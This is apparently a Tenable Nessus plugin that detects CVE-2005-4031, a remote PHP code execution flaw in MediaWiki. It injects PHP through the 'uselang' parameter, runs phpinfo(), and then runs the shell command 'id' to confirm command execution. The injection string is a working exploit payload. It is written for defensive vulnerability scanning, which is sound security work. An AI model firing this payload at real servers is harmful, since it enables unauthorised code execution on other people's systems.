#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
  script_id(20255);
  script_version("$Revision: 1.23 $");
  script_cvs_date("$Date: 2015/06/12 22:35:12 $");

  script_cve_id("CVE-2005-4031");
  script_bugtraq_id(15703);
  script_osvdb_id(21444);
 
  script_name(english:"MediaWiki Language Option eval() Function Arbitrary PHP Code Execution");
  script_summary(english:"Attempts to execute phpinfo() remotely.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by an
arbitrary command execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of MediaWiki running on the remote host is affected by a
remote command execution vulnerability due to improper sanitization of
user-supplied input. An unauthenticated, remote attacker can execute
arbitrary PHP and shell commands on the remote host, subject to the
privileges of the web server user id.");
  # http://sourceforge.net/project/shownotes.php?group_id=34373&release_id=375755
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?5d68d6da");
  script_set_attribute(attribute:"solution", value:"Upgrade to MediaWiki 1.5.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/12/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/12/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:mediawiki:mediawiki");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencies("mediawiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/MediaWiki", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "MediaWiki";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

function cmd(loc, cmd)
{
  local_var	w, res;
  w = http_send_recv3(method:"GET", item:loc + urlencode(unreserved:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*'()-]/?=", 
str: '/index.php?uselang=tns extends LanguageUtf8 {
function getVariants() {
	return 0;
 }
}
'+ cmd + '
class foobar'), port:port, exit_on_fail:TRUE);
  
  return w[2];
}

loc = install['path'];;
res = cmd(cmd:"phpinfo();", loc:loc);
if ( "<title>phpinfo()</title>" >< res ) 
{
  # Unix only 
  res = egrep(pattern:"uid=[0-9].*gid=[0-9].*", string:cmd(cmd:'echo `id`;', loc:loc));
  if (res) 
  {
    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      cmd         : 'id',
      line_limit  : 2,
      request     : make_list(http_last_sent_request()),
      output      : chomp(res)
    );
  }
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:loc, port:port));
